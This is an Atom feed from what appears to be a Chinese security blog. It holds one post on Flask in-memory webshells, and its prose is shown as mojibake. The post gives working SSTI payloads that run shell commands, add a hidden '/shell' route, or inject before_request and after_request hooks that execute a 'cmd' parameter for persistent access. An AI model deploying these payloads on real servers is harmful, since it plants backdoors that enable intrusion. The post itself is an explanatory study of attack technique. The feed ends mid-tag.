<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é›²æµã®Lowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2024-08-09T17:44:45.890Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Flaskå†…å­˜é©¬</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-08-09T12:53:34.000Z</published>
    <updated>2024-08-09T17:44:45.890Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¹´è½»äººå­¦çš„ç¬¬ä¸€ä¸ªå†…å­˜é©¬ï¼Œç«Ÿç„¶ä¸æ˜¯javaï¼ˆ</p><p>çœ‹å¤§ä¼™å¥½åƒå‰å‡ ä¸ªæœˆéƒ½åœ¨ç ”ç©¶è¿™ä¸ªï¼Œå­¦ä¸€ä¸‹ï¼Œé¡ºå¸¦å¤å¥ä¸€ä¸‹ï¼Œå·²ç»æ‘¸äº†ä¸¤å‘¨ğŸŸäº†</p><p>å‚è€ƒï¼š</p><p><a href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p><p><a href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://xz.aliyun.com/t/14421">https://xz.aliyun.com/t/14421</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><span id="more"></span><hr><p>å…ˆå‡†å¤‡ä¸€ä¸ªFlask SSTIæ¼æ´ç¯å¢ƒï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    person <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        person <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    template <span class="token operator">=</span> <span class="token string">'&lt;h2>Hello %s!&lt;/h2>'</span> <span class="token operator">%</span> person    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾"><a href="#debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾" class="headerlink" title="debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾"></a>debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾</h1><p>åœ¨debugæ¨¡å¼ä¸‹ï¼ŒæŠ¥é”™ä¼šå¸¦å‡ºè¯¦ç»†ä¿¡æ¯ï¼Œdebugæ¨¡å¼å¸¸è§çš„è€ƒç‚¹æœ‰ç®—pinç è¿›consoleæ¥å‘½ä»¤æ‰§è¡Œ</p><p>å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨æŠ¥é”™<code>raise Exception()</code>çš„æ–¹å¼æ¥è®©æˆ‘ä»¬çš„å‘½ä»¤å›æ˜¾</p><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"raise Exception(__import__('os').popen('whoami').read())"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809214712376.png" alt="image-20240809214712376"></p><hr><p>æ¥ä¸‹æ¥å…³é—­debugæ¨¡å¼ï¼Œå¼€å§‹ç ”ç©¶ğŸ</p><h1 id="ä½ç‰ˆæœ¬å†…å­˜é©¬"><a href="#ä½ç‰ˆæœ¬å†…å­˜é©¬" class="headerlink" title="ä½ç‰ˆæœ¬å†…å­˜é©¬"></a>ä½ç‰ˆæœ¬å†…å­˜é©¬</h1><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºæ‡’å¾—æä½ç‰ˆæœ¬çš„flaskäº†ï¼Œè¿™é‡Œå¯¹payloadé‡Œçš„å…³é”®éƒ¨åˆ†ç¨å¾®åˆ†æä¸€ä¸‹å°±è¿‡äº†</p><p>åœ¨evalä¸­ï¼Œæ‰§è¡Œäº†è¿™æ ·ä¸€ä¸ªä¸œè¥¿ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">"app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span><span class="token string">'shell'</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>top<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>"<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œè°ƒç”¨äº†Flaskå¯¹è±¡çš„<code>add_url_rule</code>æ–¹æ³•</p><h2 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule"></a>add_url_rule</h2><p>åœ¨Flaskä¸­æ³¨å†Œè·¯ç”±æ˜¯ä½¿ç”¨<code>@app.route()</code>è£…é¥°å™¨æ¥å®ç°çš„ï¼Œçœ‹ä¸€ä¸‹å…¶æºç å®ç°ï¼š</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213132894.png" alt="image-20240809213132894"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨äº†<code>add_url_rule</code>æ¥æ·»åŠ è·¯ç”±ï¼Œè¿™å‡ ä¸ªå‚æ•°çš„è¯´æ˜ï¼š</p><ul><li>ruleï¼šå‡½æ•°å¯¹åº”çš„URLè§„åˆ™ï¼Œæ»¡è¶³æ¡ä»¶å’Œ app.route() çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·ï¼Œå¿…é¡»ä»¥<code>/</code>å¼€å¤´ï¼›</li><li>endpointï¼šç«¯ç‚¹ï¼Œå³åœ¨ä½¿ç”¨ url_for() è¿›è¡Œåè½¬çš„æ—¶å€™ï¼Œè¿™é‡Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ endpoint å¯¹åº”çš„å€¼ã€‚è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥ä¸æŒ‡å®šï¼Œé‚£ä¹ˆé»˜è®¤å°±ä¼šä½¿ç”¨å‡½æ•°çš„åå­—ä½œä¸º endpoint çš„å€¼ï¼›</li><li>view_funcï¼šURLå¯¹åº”çš„å‡½æ•°ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œåªéœ€å†™å‡½æ•°åå­—è€Œä¸ç”¨åŠ æ‹¬å·ï¼‰ï¼Œä¸‹é¢çš„å›¾å¯¹ç…§çš„å°±æ˜¯<code>def home()</code>ï¼›</li><li>provide_automatic_optionsï¼šæ§åˆ¶æ˜¯å¦åº”è‡ªåŠ¨æ·»åŠ é€‰é¡¹æ–¹æ³•ã€‚è¿™ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®è§†å›¾æ¥æ§åˆ¶_func.provide_automatic_options &#x3D;æ·»åŠ è§„åˆ™å‰ä¸ºFalseï¼›</li><li>optionsï¼šè¦è½¬å‘åˆ°åŸºç¡€è§„åˆ™å¯¹è±¡çš„é€‰é¡¹ã€‚Werkzeug çš„ä¸€ä¸ªå˜åŒ–æ˜¯å¤„ç†æ–¹æ³•é€‰é¡¹ã€‚æ–¹æ³•æ˜¯æ­¤è§„åˆ™åº”é™åˆ¶çš„æ–¹æ³•åˆ—è¡¨ï¼ˆGETã€POSTç­‰ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè§„åˆ™åªä¾¦å¬ GETï¼ˆå¹¶éšå¼åœ°ä¾¦å¬HEADï¼‰</li></ul><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213643592.png" alt="image-20240809213643592"></p><p>å¯¹ç…§ä¸€ä¸‹payloadï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œæ·»åŠ äº†ä¸€æ¡è·¯ç”±ï¼Œå¤„ç†è¯¥è·¯ç”±çš„å‡½æ•°æ˜¯ä¸ªç”±lambdaå…³é”®å­—å®šä¹‰çš„åŒ¿åå‡½æ•°</p><hr><h2 id="è·å–appä¸Šä¸‹æ–‡"><a href="#è·å–appä¸Šä¸‹æ–‡" class="headerlink" title="è·å–appä¸Šä¸‹æ–‡"></a>è·å–appä¸Šä¸‹æ–‡</h2><h3 id="ä½ç‰ˆæœ¬ä¸­-request-ctx-stack"><a href="#ä½ç‰ˆæœ¬ä¸­-request-ctx-stack" class="headerlink" title="ä½ç‰ˆæœ¬ä¸­_request_ctx_stack"></a>ä½ç‰ˆæœ¬ä¸­_request_ctx_stack</h3><p><code>_request_ctx_stack</code>æ˜¯Flaskçš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ˜¯ä¸€ä¸ªLocalStackå®ä¾‹</p><blockquote><p>Flaskè¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶ï¼šå½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥Flaskï¼Œé¦–å…ˆä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextï¼Œè¿™ä¸ªä¸Šä¸‹æ–‡å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯åœ¨Requestä¸­ï¼Œå¹¶å°†è¿™ä¸ªä¸Šä¸‹æ–‡æ¨å…¥åˆ°ä¸€ä¸ªåä¸º<code>_request_ctx_stack</code> çš„æ ˆç»“æ„ä¸­</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´è·å–å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡ç­‰åŒäºè·å–<code>_request_ctx_stack</code>çš„æ ˆé¡¶å…ƒç´ <code>_request_ctx_stack.top</code>ï¼Œè¿™é‡Œç­‰ä»·äºè·å–äº†<code>&lt;Flask &#39;app&#39;&gt;</code></p><p>é‚£ä¹ˆ<code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>å°±èƒ½è·å–cmdå‚æ•°</p><h3 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span><span class="token string">'shell'</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="æ–°ç‰ˆå†…å­˜é©¬"><a href="#æ–°ç‰ˆå†…å­˜é©¬" class="headerlink" title="æ–°ç‰ˆå†…å­˜é©¬"></a>æ–°ç‰ˆå†…å­˜é©¬</h1><p>æµ‹è¯•ç‰ˆæœ¬ï¼šFlask 2.2.0</p><p>ä¸çŸ¥é“ä»å“ªä¸ªç‰ˆæœ¬å¼€å§‹ï¼Œflaskä¸å†æ”¯æŒåœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­é€šè¿‡<code>add_url_rule</code>æ·»åŠ è·¯ç”±</p><p>é‚£å°±å¾—å¦è¾Ÿè¹Šå¾„äº†</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>@app.before_request</code>æˆ–è€…<code>@app.after_request</code>è¿™ä¸¤ä¸ªåº•å±‚å‡½æ•°æ¥æ‰“</p><p>æ¥ä¸‹æ¥å…ˆä»¥ä¸‹é¢è¿™ä¸ªè·¯ç”±è¿›è¡Œæµ‹è¯•ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/e'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"1"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h2><blockquote><p>åœ¨ Flask ä¸­ï¼Œ<code>before_request</code> æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒç”¨äºåœ¨è¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œç‰¹å®šçš„å‡½æ•°ã€‚è¿™ä¸ªè£…é¥°å™¨å…è®¸å¯¹æ¯ä¸ªè¯·æ±‚è¿›è¡Œä¸€äº›é¢„å¤„ç†ï¼Œæ¯”å¦‚è®¤è¯æ£€æŸ¥ã€æ—¥å¿—è®°å½•ã€è®¾ç½®å“åº”å¤´ç­‰</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åƒä¸Šé¢è¿™ä¸ªdemoå°±æ˜¯æ£€æµ‹è¯·æ±‚ headers æœ‰æ—  Authorization å­—æ®µæ¥å®ç°èº«ä»½è®¤è¯</p><p>è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªè£…é¥°å™¨</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004201760.png" alt="image-20240810004201760"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½œç”¨æ˜¯ï¼š</p><ul><li>æ£€æŸ¥ <code>self.before_request_funcs</code> å­—å…¸ä¸­æ˜¯å¦æœ‰ä¸€ä¸ªé”®ä¸º <code>None</code> çš„æ¡ç›®ã€‚</li><li>å¦‚æœæ²¡æœ‰ <code>None</code> é”®ï¼Œå°±åœ¨å­—å…¸ä¸­åˆ›å»ºå®ƒï¼Œå¹¶å°†å…¶å€¼è®¾ç½®ä¸ºä¸€ä¸ªç©ºåˆ—è¡¨ã€‚</li><li>ç„¶åï¼Œæ— è®º <code>None</code> é”®æ˜¯å¦å­˜åœ¨ï¼Œéƒ½å°†å‡½æ•° <code>f</code> æ·»åŠ åˆ°è¿™ä¸ªåˆ—è¡¨ä¸­ã€‚</li></ul><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004555015.png" alt="image-20240810004555015"></p><p>é‚£ä¹ˆè¿™ä¸ª<code>f</code>å°±æ˜¯æˆ‘ä»¬æ·»åŠ çš„å‡½æ•°äº†ï¼Œäºæ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ª lambda å‡½æ•°ï¼Œè¿™æ ·åœ¨æ¯æ¬¡å‘èµ·è¯·æ±‚å‰å°±éƒ½ä¼šè§¦å‘äº†</p><p>äºæ˜¯å¯ä»¥æ„é€ æˆ‘ä»¬çš„payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810005710518.png" alt="image-20240810005710518"></p><p>ç¬¬ä¸€æ¬¡å†™å…¥è¿›å»ï¼Œä¹‹åæ‰€æœ‰çš„è®¿é—®è¯·æ±‚éƒ½ä¼šè¿”å›123</p><p>ä¸è¿‡å¼Šç«¯ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä½¿ç”¨lambdaå¿…ç„¶ä¼šå¾—åˆ°ä¸€ä¸ªè¿”å›å€¼ï¼Œé‚£ä¹ˆæœåŠ¡åç»­çš„æ“ä½œéƒ½æ— æ³•è¿›è¡Œï¼Œä¼šå½±å“åˆ°ä¸»æœºçš„æ­£å¸¸ä¸šåŠ¡</p><hr><h2 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h2><p>å’Œ before_request ç›¸åï¼Œ<code>after_request</code>ä¼šåœ¨è¯·æ±‚ç»“æŸå¾—åˆ°å“åº”åŒ…ä¹‹åè¿›è¡Œæ“ä½œ</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810010120613.png" alt="image-20240810010120613"></p><p>å’Œå‰é¢é‚£ä¸ªä¸€æ ·ï¼Œå”¯ä¸€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªéœ€è¦å®šä¹‰ä¸€ä¸ªè¿”å›å€¼ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™</p><p>æ„é€ payloadï¼šï¼ˆæ³¨æ„ï¼Œåœ¨æœ¬äººçš„æµ‹è¯•ç‰ˆæœ¬ä¸Šéœ€è¦æå‰åœ¨ä»£ç ä¸­å¯¼å…¥å¯¹åº”çš„åŒ…æ‰å¯æ‰“å…¥payloadï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>after_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'global CmdResp;CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">else</span> resp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‡½æ•°çš„å†…å®¹ä¸ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> <span class="token comment"># ä¼ å…¥å‚æ•°</span>    CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span>      <span class="token comment"># å¦‚æœè¯·æ±‚å‚æ•°å«æœ‰cmdåˆ™è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span>'        <span class="token keyword">global</span> CmdResp<span class="token punctuation">;</span>     <span class="token comment"># å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ–¹ä¾¿è·å–</span>        CmdResp<span class="token operator">=</span>make_response<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span>\'cmd\'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># åˆ›å»ºä¸€ä¸ªå“åº”å¯¹è±¡</span>    '<span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span>    <span class="token comment"># æ’çœŸ</span>    <span class="token keyword">else</span> resp<span class="token punctuation">)</span>  <span class="token comment"># å¦‚æœè¯·æ±‚å‚æ•°æ²¡æœ‰cmdåˆ™æ­£å¸¸è¿”å›</span><span class="token comment"># è¿™é‡Œçš„cmdå‚æ•°åå’ŒCmdRespå˜é‡åéƒ½æ˜¯å¯ä»¥æ”¹çš„ï¼Œæœ€å¥½æ”¹æˆæœåŠ¡ä¸­ä¸å­˜åœ¨çš„å˜é‡åä»¥å…å½±å“æ­£å¸¸ä¸šåŠ¡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å…¥åå°±getshelläº†</p><hr><h2 id="å…¶å®ƒçš„é’©å­"><a href="#å…¶å®ƒçš„é’©å­" class="headerlink" title="å…¶å®ƒçš„é’©å­"></a>å…¶å®ƒçš„é’©å­</h2><p>éƒ½æ˜¯gxngxngxnå¸ˆå‚…æ‰¾åˆ°çš„ï¼Œtql</p><p><code>teardown_request</code>ï¼šè·Ÿå‰é¢<code>after_request</code>çš„ç±»ä¼¼ï¼Œpayloadä¹Ÿé€šç”¨ï¼Œæ”¹ä¸ªè°ƒç”¨çš„åº•å±‚å‡½æ•°åå°±è¡Œï¼Œä½†æ˜¯æ— å›æ˜¾ã€‚ã€‚</p><h3 id="error-handler-spec"><a href="#error-handler-spec" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><blockquote><p>è¯¥å‡½æ•°ç”¨äºè‡ªå®šä¹‰404é¡µé¢çš„å›æ˜¾</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">errortest</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error_handler(404)'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'404 Err0r'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012504500.png" alt="image-20240810012504500"></p><p>è·Ÿè¿›è¿™ä¸ªè£…é¥°å™¨çš„åº•å±‚é€»è¾‘</p><p><img 